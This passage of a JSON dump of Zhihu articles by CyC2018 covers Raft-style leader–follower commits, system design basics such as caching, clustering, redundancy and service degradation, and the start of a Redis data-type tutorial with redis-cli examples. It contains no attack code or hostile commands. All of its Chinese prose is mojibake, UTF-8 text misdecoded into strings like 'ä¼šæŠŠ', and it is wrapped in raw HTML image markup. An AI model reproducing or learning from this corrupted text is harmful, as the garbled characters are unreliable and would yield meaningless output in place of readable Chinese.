src=\"https://pic4.zhimg.com/v2-c571677785e2d616c058eff45bb3eccb_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"825\" data-rawheight=\"447\" data-thumbnail=\"https://pic4.zhimg.com/v2-c571677785e2d616c058eff45bb3eccb_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"825\" data-original=\"https://pic4.zhimg.com/v2-c571677785e2d616c058eff45bb3eccb_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;825&#39; height=&#39;447&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"825\" data-rawheight=\"447\" data-thumbnail=\"https://pic4.zhimg.com/v2-c571677785e2d616c058eff45bb3eccb_b.jpg\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"825\" data-original=\"https://pic4.zhimg.com/v2-c571677785e2d616c058eff45bb3eccb_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-c571677785e2d616c058eff45bb3eccb_b.gif\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><ul><li>Leader ä¼šæŠŠä¿®æ”¹å¤åˆ¶åˆ°æ‰€æœ‰ Followerã€‚</li></ul><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-e60d9756f05d881d5d33906655fc0ed5_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"825\" data-rawheight=\"447\" data-thumbnail=\"https://pic2.zhimg.com/v2-e60d9756f05d881d5d33906655fc0ed5_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"825\" data-original=\"https://pic2.zhimg.com/v2-e60d9756f05d881d5d33906655fc0ed5_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;825&#39; height=&#39;447&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"825\" data-rawheight=\"447\" data-thumbnail=\"https://pic2.zhimg.com/v2-e60d9756f05d881d5d33906655fc0ed5_b.jpg\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"825\" data-original=\"https://pic2.zhimg.com/v2-e60d9756f05d881d5d33906655fc0ed5_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-e60d9756f05d881d5d33906655fc0ed5_b.gif\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><ul><li>Leader ä¼šç­‰å¾…å¤§å¤šæ•°çš„ Follower ä¹Ÿè¿›è¡Œäº†ä¿®æ”¹ï¼Œç„¶åæ‰å°†ä¿®æ”¹æäº¤ã€‚</li></ul><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-a9116fc2718b3e760e04b0153dc58961_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"825\" data-rawheight=\"447\" data-thumbnail=\"https://pic2.zhimg.com/v2-a9116fc2718b3e760e04b0153dc58961_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"825\" data-original=\"https://pic2.zhimg.com/v2-a9116fc2718b3e760e04b0153dc58961_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;825&#39; height=&#39;447&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"825\" data-rawheight=\"447\" data-thumbnail=\"https://pic2.zhimg.com/v2-a9116fc2718b3e760e04b0153dc58961_b.jpg\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"825\" data-original=\"https://pic2.zhimg.com/v2-a9116fc2718b3e760e04b0153dc58961_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-a9116fc2718b3e760e04b0153dc58961_b.gif\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><ul><li>æ­¤æ—¶ Leader ä¼šé€šçŸ¥çš„æ‰€æœ‰ Follower è®©å®ƒä»¬ä¹Ÿæäº¤ä¿®æ”¹ï¼Œæ­¤æ—¶æ‰€æœ‰èŠ‚ç‚¹çš„å€¼è¾¾æˆä¸€è‡´ã€‚</li></ul><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-e97604005bbe893e3e3367c8feab047f_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"825\" data-rawheight=\"447\" data-thumbnail=\"https://pic4.zhimg.com/v2-e97604005bbe893e3e3367c8feab047f_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"825\" data-original=\"https://pic4.zhimg.com/v2-e97604005bbe893e3e3367c8feab047f_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;825&#39; height=&#39;447&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"825\" data-rawheight=\"447\" data-thumbnail=\"https://pic4.zhimg.com/v2-e97604005bbe893e3e3367c8feab047f_b.jpg\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"825\" data-original=\"https://pic4.zhimg.com/v2-e97604005bbe893e3e3367c8feab047f_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-e97604005bbe893e3e3367c8feab047f_b.gif\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>å‚è€ƒ</h2><ul><li>å€ªè¶…. ä» Paxos åˆ° ZooKeeper : åˆ†å¸ƒå¼ä¸€è‡´æ€§åŸç†ä¸å®è·µ [M]. ç”µå­å·¥ä¸šå‡ºç‰ˆç¤¾, 2015.</li><li><a href=\"https://link.zhihu.com/?target=https%3A//redis.io/topics/distlock\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Distributed locks with Redis</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//www.linkedkeeper.com/detail/blog.action%3Fbid%3D1023\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">æµ…è°ˆåˆ†å¸ƒå¼é”</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//www.dengshenyu.com/java/%25E5%2588%2586%25E5%25B8%2583%25E5%25BC%258F%25E7%25B3%25BB%25E7%25BB%259F/2017/10/23/zookeeper-distributed-lock.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">åŸºäº Zookeeper çš„åˆ†å¸ƒå¼é”</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//thesecretlivesofdata.com/raft\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Raft: Understandable Distributed Consensus</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//www.cnblogs.com/savorboard/p/distributed-system-transaction-consistency.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">èŠèŠåˆ†å¸ƒå¼äº‹åŠ¡ï¼Œå†è¯´è¯´è§£å†³æ–¹æ¡ˆ</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//coolshell.cn/articles/10910.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">åˆ†å¸ƒå¼ç³»ç»Ÿçš„äº‹åŠ¡å¤„ç†</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//juejin.im/entry/577c6f220a2b5800573492be\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">æ·±å…¥ç†è§£åˆ†å¸ƒå¼äº‹åŠ¡</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//www.colooshiki.com/index.php/2017/04/20/what-is-cap-theorem-in-distributed-database-system/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">What is CAP theorem in distributed database system?</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//harry.me/blog/2014/12/27/neat-algorithms-paxos/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NEAT ALGORITHMS - PAXOS</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//angus.nyc/2012/paxos-by-example/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Paxos By Example</a></li></ul><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-4d7b61186191042d91d230ccb26a7d99_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"899\" data-rawheight=\"351\" class=\"origin_image zh-lightbox-thumb\" width=\"899\" data-original=\"https://pic2.zhimg.com/v2-4d7b61186191042d91d230ccb26a7d99_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;899&#39; height=&#39;351&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"899\" data-rawheight=\"351\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"899\" data-original=\"https://pic2.zhimg.com/v2-4d7b61186191042d91d230ccb26a7d99_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-4d7b61186191042d91d230ccb26a7d99_b.jpg\"/></figure><p></p>", 
            "topic": [
                {
                    "tag": "åˆ†å¸ƒå¼ç³»ç»Ÿ", 
                    "tagLink": "https://api.zhihu.com/topics/19570823"
                }, 
                {
                    "tag": "é¢è¯•", 
                    "tagLink": "https://api.zhihu.com/topics/19552079"
                }, 
                {
                    "tag": "ç³»ç»Ÿè®¾è®¡", 
                    "tagLink": "https://api.zhihu.com/topics/19572259"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/68500774", 
            "userName": "CyC2018", 
            "userLink": "https://www.zhihu.com/people/de0dbaba77411ee53dd3207d762ad7d5", 
            "upvote": 0, 
            "title": "ç³»ç»Ÿè®¾è®¡åŸºç¡€", 
            "content": "<p></p><h2>ä¸€ã€æ€§èƒ½</h2><h2>æ€§èƒ½æŒ‡æ ‡</h2><h3>1. å“åº”æ—¶é—´</h3><p>æŒ‡æŸä¸ªè¯·æ±‚ä»å‘å‡ºåˆ°æ¥æ”¶åˆ°å“åº”æ¶ˆè€—çš„æ—¶é—´ã€‚</p><p>åœ¨å¯¹å“åº”æ—¶é—´è¿›è¡Œæµ‹è¯•æ—¶ï¼Œé€šå¸¸é‡‡ç”¨é‡å¤è¯·æ±‚çš„æ–¹å¼ï¼Œç„¶åè®¡ç®—å¹³å‡å“åº”æ—¶é—´ã€‚</p><h3>2. ååé‡</h3><p>æŒ‡ç³»ç»Ÿåœ¨å•ä½æ—¶é—´å†…å¯ä»¥å¤„ç†çš„è¯·æ±‚æ•°é‡ï¼Œé€šå¸¸ä½¿ç”¨æ¯ç§’çš„è¯·æ±‚æ•°æ¥è¡¡é‡ã€‚</p><h3>3. å¹¶å‘ç”¨æˆ·æ•°</h3><p>æŒ‡ç³»ç»Ÿèƒ½åŒæ—¶å¤„ç†çš„å¹¶å‘ç”¨æˆ·è¯·æ±‚æ•°é‡ã€‚</p><p>åœ¨æ²¡æœ‰å¹¶å‘å­˜åœ¨çš„ç³»ç»Ÿä¸­ï¼Œè¯·æ±‚è¢«é¡ºåºæ‰§è¡Œï¼Œæ­¤æ—¶å“åº”æ—¶é—´ä¸ºååé‡çš„å€’æ•°ã€‚ä¾‹å¦‚ç³»ç»Ÿæ”¯æŒçš„ååé‡ä¸º 100 req/sï¼Œé‚£ä¹ˆå¹³å‡å“åº”æ—¶é—´åº”è¯¥ä¸º 0.01sã€‚</p><p>ç›®å‰çš„å¤§å‹ç³»ç»Ÿéƒ½æ”¯æŒå¤šçº¿ç¨‹æ¥å¤„ç†å¹¶å‘è¯·æ±‚ï¼Œå¤šçº¿ç¨‹èƒ½å¤Ÿæé«˜ååé‡ä»¥åŠç¼©çŸ­å“åº”æ—¶é—´ï¼Œä¸»è¦æœ‰ä¸¤ä¸ªåŸå› ï¼š</p><ul><li>å¤š CPU</li><li>IO ç­‰å¾…æ—¶é—´</li></ul><p>ä½¿ç”¨ IO å¤šè·¯å¤ç”¨ç­‰æ–¹å¼ï¼Œç³»ç»Ÿåœ¨ç­‰å¾…ä¸€ä¸ª IO æ“ä½œå®Œæˆçš„è¿™æ®µæ—¶é—´å†…ä¸éœ€è¦è¢«é˜»å¡ï¼Œå¯ä»¥å»å¤„ç†å…¶å®ƒè¯·æ±‚ã€‚é€šè¿‡å°†è¿™ä¸ªç­‰å¾…æ—¶é—´åˆ©ç”¨èµ·æ¥ï¼Œä½¿å¾— CPU åˆ©ç”¨ç‡å¤§å¤§æé«˜ã€‚</p><p>å¹¶å‘ç”¨æˆ·æ•°ä¸æ˜¯è¶Šé«˜è¶Šå¥½ï¼Œå› ä¸ºå¦‚æœå¹¶å‘ç”¨æˆ·æ•°å¤ªé«˜ï¼Œç³»ç»Ÿæ¥ä¸åŠå¤„ç†è¿™ä¹ˆå¤šçš„è¯·æ±‚ï¼Œä¼šä½¿å¾—è¿‡å¤šçš„è¯·æ±‚éœ€è¦ç­‰å¾…ï¼Œé‚£ä¹ˆå“åº”æ—¶é—´å°±ä¼šå¤§å¤§æé«˜ã€‚</p><h2>æ€§èƒ½ä¼˜åŒ–</h2><h3>1. é›†ç¾¤</h3><p>å°†å¤šå°æœåŠ¡å™¨ç»„æˆé›†ç¾¤ï¼Œä½¿ç”¨è´Ÿè½½å‡è¡¡å°†è¯·æ±‚è½¬å‘åˆ°é›†ç¾¤ä¸­ï¼Œé¿å…å•ä¸€æœåŠ¡å™¨çš„è´Ÿè½½å‹åŠ›è¿‡å¤§å¯¼è‡´æ€§èƒ½é™ä½ã€‚</p><h3>2. ç¼“å­˜</h3><p>ç¼“å­˜èƒ½å¤Ÿæé«˜æ€§èƒ½çš„åŸå› å¦‚ä¸‹ï¼š</p><ul><li>ç¼“å­˜æ•°æ®é€šå¸¸ä½äºå†…å­˜ç­‰ä»‹è´¨ä¸­ï¼Œè¿™ç§ä»‹è´¨å¯¹äºè¯»æ“ä½œç‰¹åˆ«å¿«ï¼›</li><li>ç¼“å­˜æ•°æ®å¯ä»¥ä½äºé è¿‘ç”¨æˆ·çš„åœ°ç†ä½ç½®ä¸Šï¼›</li><li>å¯ä»¥å°†è®¡ç®—ç»“æœè¿›è¡Œç¼“å­˜ï¼Œä»è€Œé¿å…é‡å¤è®¡ç®—ã€‚</li></ul><h3>3. å¼‚æ­¥</h3><p>æŸäº›æµç¨‹å¯ä»¥å°†æ“ä½œè½¬æ¢ä¸ºæ¶ˆæ¯ï¼Œå°†æ¶ˆæ¯å‘é€åˆ°æ¶ˆæ¯é˜Ÿåˆ—ä¹‹åç«‹å³è¿”å›ï¼Œä¹‹åè¿™ä¸ªæ“ä½œä¼šè¢«å¼‚æ­¥å¤„ç†ã€‚</p><h2>äºŒã€ä¼¸ç¼©æ€§</h2><p>æŒ‡ä¸æ–­å‘é›†ç¾¤ä¸­æ·»åŠ æœåŠ¡å™¨æ¥ç¼“è§£ä¸æ–­ä¸Šå‡çš„ç”¨æˆ·å¹¶å‘è®¿é—®å‹åŠ›å’Œä¸æ–­å¢é•¿çš„æ•°æ®å­˜å‚¨éœ€æ±‚ã€‚</p><h2>ä¼¸ç¼©æ€§ä¸æ€§èƒ½</h2><p>å¦‚æœç³»ç»Ÿå­˜åœ¨æ€§èƒ½é—®é¢˜ï¼Œé‚£ä¹ˆå•ä¸ªç”¨æˆ·çš„è¯·æ±‚æ€»æ˜¯å¾ˆæ…¢çš„ï¼›</p><p>å¦‚æœç³»ç»Ÿå­˜åœ¨ä¼¸ç¼©æ€§é—®é¢˜ï¼Œé‚£ä¹ˆå•ä¸ªç”¨æˆ·çš„è¯·æ±‚å¯èƒ½ä¼šå¾ˆå¿«ï¼Œä½†æ˜¯åœ¨å¹¶å‘æ•°å¾ˆé«˜çš„æƒ…å†µä¸‹ç³»ç»Ÿä¼šå¾ˆæ…¢ã€‚</p><h2>å®ç°ä¼¸ç¼©æ€§</h2><p>åº”ç”¨æœåŠ¡å™¨åªè¦ä¸å…·æœ‰çŠ¶æ€ï¼Œé‚£ä¹ˆå°±å¯ä»¥å¾ˆå®¹æ˜“åœ°é€šè¿‡è´Ÿè½½å‡è¡¡å™¨å‘é›†ç¾¤ä¸­æ·»åŠ æ–°çš„æœåŠ¡å™¨ã€‚</p><p>å…³ç³»å‹æ•°æ®åº“çš„ä¼¸ç¼©æ€§é€šè¿‡ Sharding æ¥å®ç°ï¼Œå°†æ•°æ®æŒ‰ä¸€å®šçš„è§„åˆ™åˆ†å¸ƒåˆ°ä¸åŒçš„èŠ‚ç‚¹ä¸Šï¼Œä»è€Œè§£å†³å•å°å­˜å‚¨æœåŠ¡å™¨çš„å­˜å‚¨ç©ºé—´é™åˆ¶ã€‚</p><p>å¯¹äºéå…³ç³»å‹æ•°æ®åº“ï¼Œå®ƒä»¬å¤©ç”Ÿå°±æ˜¯ä¸ºæµ·é‡æ•°æ®è€Œè¯ç”Ÿï¼Œå¯¹ä¼¸ç¼©æ€§çš„æ”¯æŒç‰¹åˆ«å¥½ã€‚</p><h2>ä¸‰ã€æ‰©å±•æ€§</h2><p>æŒ‡çš„æ˜¯æ·»åŠ æ–°åŠŸèƒ½æ—¶å¯¹ç°æœ‰ç³»ç»Ÿçš„å…¶å®ƒåº”ç”¨æ— å½±å“ï¼Œè¿™å°±è¦æ±‚ä¸åŒåº”ç”¨å…·å¤‡ä½è€¦åˆçš„ç‰¹ç‚¹ã€‚</p><p>å®ç°å¯æ‰©å±•ä¸»è¦æœ‰ä¸¤ç§æ–¹å¼ï¼š</p><ul><li>ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—è¿›è¡Œè§£è€¦ï¼Œåº”ç”¨ä¹‹é—´é€šè¿‡æ¶ˆæ¯ä¼ é€’è¿›è¡Œé€šä¿¡ï¼›</li><li>ä½¿ç”¨åˆ†å¸ƒå¼æœåŠ¡å°†ä¸šåŠ¡å’Œå¯å¤ç”¨çš„æœåŠ¡åˆ†ç¦»å¼€æ¥ï¼Œä¸šåŠ¡ä½¿ç”¨åˆ†å¸ƒå¼æœåŠ¡æ¡†æ¶è°ƒç”¨å¯å¤ç”¨çš„æœåŠ¡ã€‚æ–°å¢çš„äº§å“å¯ä»¥é€šè¿‡è°ƒç”¨å¯å¤ç”¨çš„æœåŠ¡æ¥å®ç°ä¸šåŠ¡é€»è¾‘ï¼Œå¯¹å…¶å®ƒäº§å“æ²¡æœ‰å½±å“ã€‚</li></ul><h2>å››ã€å¯ç”¨æ€§</h2><h2>å†—ä½™</h2><p>ä¿è¯é«˜å¯ç”¨çš„ä¸»è¦æ‰‹æ®µæ˜¯ä½¿ç”¨å†—ä½™ï¼Œå½“æŸä¸ªæœåŠ¡å™¨æ•…éšœæ—¶å°±è¯·æ±‚å…¶å®ƒæœåŠ¡å™¨ã€‚</p><p>åº”ç”¨æœåŠ¡å™¨çš„å†—ä½™æ¯”è¾ƒå®¹æ˜“å®ç°ï¼Œåªè¦ä¿è¯åº”ç”¨æœåŠ¡å™¨ä¸å…·æœ‰çŠ¶æ€ï¼Œé‚£ä¹ˆæŸä¸ªåº”ç”¨æœåŠ¡å™¨æ•…éšœæ—¶ï¼Œè´Ÿè½½å‡è¡¡å™¨å°†è¯¥åº”ç”¨æœåŠ¡å™¨åŸå…ˆçš„ç”¨æˆ·è¯·æ±‚è½¬å‘åˆ°å¦ä¸€ä¸ªåº”ç”¨æœåŠ¡å™¨ä¸Šï¼Œä¸ä¼šå¯¹ç”¨æˆ·æœ‰ä»»ä½•å½±å“ã€‚</p><p>å­˜å‚¨æœåŠ¡å™¨çš„å†—ä½™éœ€è¦ä½¿ç”¨ä¸»ä»å¤åˆ¶æ¥å®ç°ï¼Œå½“ä¸»æœåŠ¡å™¨æ•…éšœæ—¶ï¼Œéœ€è¦æå‡ä»æœåŠ¡å™¨ä¸ºä¸»æœåŠ¡å™¨ï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºåˆ‡æ¢ã€‚</p><h2>ç›‘æ§</h2><p>å¯¹ CPUã€å†…å­˜ã€ç£ç›˜ã€ç½‘ç»œç­‰ç³»ç»Ÿè´Ÿè½½ä¿¡æ¯è¿›è¡Œç›‘æ§ï¼Œå½“æŸä¸ªä¿¡æ¯è¾¾åˆ°ä¸€å®šé˜ˆå€¼æ—¶é€šçŸ¥è¿ç»´äººå‘˜ï¼Œä»è€Œåœ¨ç³»ç»Ÿå‘ç”Ÿæ•…éšœä¹‹å‰åŠæ—¶å‘ç°é—®é¢˜ã€‚</p><h2>æœåŠ¡é™çº§</h2><p>æœåŠ¡é™çº§æ˜¯ç³»ç»Ÿä¸ºäº†åº”å¯¹å¤§é‡çš„è¯·æ±‚ï¼Œä¸»åŠ¨å…³é—­éƒ¨åˆ†åŠŸèƒ½ï¼Œä»è€Œä¿è¯æ ¸å¿ƒåŠŸèƒ½å¯ç”¨ã€‚</p><h2>äº”ã€å®‰å…¨æ€§</h2><p>è¦æ±‚ç³»ç»Ÿåœ¨åº”å¯¹å„ç§æ”»å‡»æ‰‹æ®µæ—¶èƒ½å¤Ÿæœ‰å¯é çš„åº”å¯¹æªæ–½ã€‚</p><h2>å‚è€ƒèµ„æ–™</h2><ul><li>å¤§å‹ç½‘ç«™æŠ€æœ¯æ¶æ„ï¼šæ ¸å¿ƒåŸç†ä¸æ¡ˆä¾‹åˆ†æ</li></ul><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-4d7b61186191042d91d230ccb26a7d99_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"899\" data-rawheight=\"351\" class=\"origin_image zh-lightbox-thumb\" width=\"899\" data-original=\"https://pic2.zhimg.com/v2-4d7b61186191042d91d230ccb26a7d99_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;899&#39; height=&#39;351&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"899\" data-rawheight=\"351\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"899\" data-original=\"https://pic2.zhimg.com/v2-4d7b61186191042d91d230ccb26a7d99_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-4d7b61186191042d91d230ccb26a7d99_b.jpg\"/></figure><p></p>", 
            "topic": [
                {
                    "tag": "ç³»ç»Ÿè®¾è®¡", 
                    "tagLink": "https://api.zhihu.com/topics/19572259"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/68500713", 
            "userName": "CyC2018", 
            "userLink": "https://www.zhihu.com/people/de0dbaba77411ee53dd3207d762ad7d5", 
            "upvote": 1, 
            "title": "Redis", 
            "content": "<p></p><h2>ä¸€ã€æ¦‚è¿°</h2><p>Redis æ˜¯é€Ÿåº¦éå¸¸å¿«çš„éå…³ç³»å‹ï¼ˆNoSQLï¼‰å†…å­˜é”®å€¼æ•°æ®åº“ï¼Œå¯ä»¥å­˜å‚¨é”®å’Œäº”ç§ä¸åŒç±»å‹çš„å€¼ä¹‹é—´çš„æ˜ å°„ã€‚</p><p>é”®çš„ç±»å‹åªèƒ½ä¸ºå­—ç¬¦ä¸²ï¼Œå€¼æ”¯æŒäº”ç§æ•°æ®ç±»å‹ï¼šå­—ç¬¦ä¸²ã€åˆ—è¡¨ã€é›†åˆã€æ•£åˆ—è¡¨ã€æœ‰åºé›†åˆã€‚</p><p>Redis æ”¯æŒå¾ˆå¤šç‰¹æ€§ï¼Œä¾‹å¦‚å°†å†…å­˜ä¸­çš„æ•°æ®æŒä¹…åŒ–åˆ°ç¡¬ç›˜ä¸­ï¼Œä½¿ç”¨å¤åˆ¶æ¥æ‰©å±•è¯»æ€§èƒ½ï¼Œä½¿ç”¨åˆ†ç‰‡æ¥æ‰©å±•å†™æ€§èƒ½ã€‚</p><h2>äºŒã€æ•°æ®ç±»å‹</h2><p>| æ•°æ®ç±»å‹ | å¯ä»¥å­˜å‚¨çš„å€¼ | æ“ä½œ | | :--: | :--: | :--: | | STRING | å­—ç¬¦ä¸²ã€æ•´æ•°æˆ–è€…æµ®ç‚¹æ•° | å¯¹æ•´ä¸ªå­—ç¬¦ä¸²æˆ–è€…å­—ç¬¦ä¸²çš„å…¶ä¸­ä¸€éƒ¨åˆ†æ‰§è¡Œæ“ä½œ<br/> å¯¹æ•´æ•°å’Œæµ®ç‚¹æ•°æ‰§è¡Œè‡ªå¢æˆ–è€…è‡ªå‡æ“ä½œ | | LIST | åˆ—è¡¨ | ä»ä¸¤ç«¯å‹å…¥æˆ–è€…å¼¹å‡ºå…ƒç´  <br/> å¯¹å•ä¸ªæˆ–è€…å¤šä¸ªå…ƒç´ è¿›è¡Œä¿®å‰ªï¼Œ<br/> åªä¿ç•™ä¸€ä¸ªèŒƒå›´å†…çš„å…ƒç´  | | SET | æ— åºé›†åˆ | æ·»åŠ ã€è·å–ã€ç§»é™¤å•ä¸ªå…ƒç´ <br/> æ£€æŸ¥ä¸€ä¸ªå…ƒç´ æ˜¯å¦å­˜åœ¨äºé›†åˆä¸­<br/> è®¡ç®—äº¤é›†ã€å¹¶é›†ã€å·®é›†<br/> ä»é›†åˆé‡Œé¢éšæœºè·å–å…ƒç´  | | HASH | åŒ…å«é”®å€¼å¯¹çš„æ— åºæ•£åˆ—è¡¨ | æ·»åŠ ã€è·å–ã€ç§»é™¤å•ä¸ªé”®å€¼å¯¹<br/> è·å–æ‰€æœ‰é”®å€¼å¯¹<br/> æ£€æŸ¥æŸä¸ªé”®æ˜¯å¦å­˜åœ¨| | ZSET | æœ‰åºé›†åˆ | æ·»åŠ ã€è·å–ã€åˆ é™¤å…ƒç´ <br/> æ ¹æ®åˆ†å€¼èŒƒå›´æˆ–è€…æˆå‘˜æ¥è·å–å…ƒç´ <br/> è®¡ç®—ä¸€ä¸ªé”®çš„æ’å |</p><blockquote><a href=\"https://link.zhihu.com/?target=https%3A//redislabs.com/ebook/part-1-getting-started/chapter-1-getting-to-know-redis/1-2-what-redis-data-structures-look-like/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">What Redis data structures look like</a><br/> </blockquote><h2>STRING</h2><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-a52d2c2abb30c2758c4a10d148f99ba8_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"773\" data-rawheight=\"504\" class=\"origin_image zh-lightbox-thumb\" width=\"773\" data-original=\"https://pic1.zhimg.com/v2-a52d2c2abb30c2758c4a10d148f99ba8_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;773&#39; height=&#39;504&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"773\" data-rawheight=\"504\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"773\" data-original=\"https://pic1.zhimg.com/v2-a52d2c2abb30c2758c4a10d148f99ba8_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-a52d2c2abb30c2758c4a10d148f99ba8_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><div class=\"highlight\"><pre><code class=\"language-html\">&gt; set hello world\nOK\n&gt; get hello\n&#34;world&#34;\n&gt; del hello\n(integer) 1\n&gt; get hello\n(nil)</code></pre></div><h2>LIST</h2><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-0d52589360afc3f91ff8e301642b371d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"752\" data-rawheight=\"554\" class=\"origin_image zh-lightbox-thumb\" width=\"752\" data-original=\"https://pic2.zhimg.com/v2-0d52589360afc3f91ff8e301642b371d_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;752&#39; height=&#39;554&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"752\" data-rawheight=\"554\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"752\" data-original=\"https://pic2.zhimg.com/v2-0d52589360afc3f91ff8e301642b371d_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-0d52589360afc3f91ff8e301642b371d_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><div class=\"highlight\"><pre><code class=\"language-html\">&gt; rpush list-key item\n(integer) 1\n&gt; rpush list-key item2\n(integer) 2\n&gt; rpush list-key item\n(integer) 3\n\n&gt; lrange list-key 0 -1\n1) &#34;item&#34;\n2) &#34;item2&#34;\n3) &#34;item&#34;\n\n&gt; lindex list-key 1\n&#34;item2&#34;\n\n&gt; lpop list-key\n&#34;item&#34;\n\n&gt; lrange list-key 0 -1\n1) &#34;item2&#34;\n2) &#34;item&#34;</code></pre></div><h2>SET</h2><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-5b0d9c30927111280bcbef0e64b163b7_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"759\" data-rawheight=\"529\" class=\"origin_image zh-lightbox-thumb\" width=\"759\" data-original=\"https://pic4.zhimg.com/v2-5b0d9c30927111280bcbef0e64b163b7_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;759&#39; height=&#39;529&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"759\" data-rawheight=\"529\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"759\" data-original=\"https://pic4.zhimg.com/v2-5b0d9c30927111280bcbef0e64b163b7_r.jpg\" 